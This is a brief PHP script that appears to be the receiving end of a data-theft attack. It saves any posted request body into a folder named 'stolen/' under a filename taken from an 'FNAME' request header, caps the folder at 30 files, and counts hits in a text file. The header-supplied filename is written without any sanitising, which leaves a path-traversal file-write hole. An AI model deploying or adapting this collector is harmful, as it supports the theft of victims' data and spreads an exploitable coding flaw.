<?php
$fname = $_SERVER["HTTP_FNAME"];
$inp = file_get_contents("php://input");

$ok = true;
$file = scandir("stolen/");
if(sizeof($file) >= 30)
{
$ok = false;
}

if($inp != "" && strlen($fname) > 0 && $ok)
{
$p = "stolen/" . $fname . ".html";
file_put_contents($p, $inp);
chmod($p, 0640);
}

$oldCount = file_get_contents('count_fileclick.txt');

file_put_contents('count_fileclick.txt', $oldCount + 1);
?>
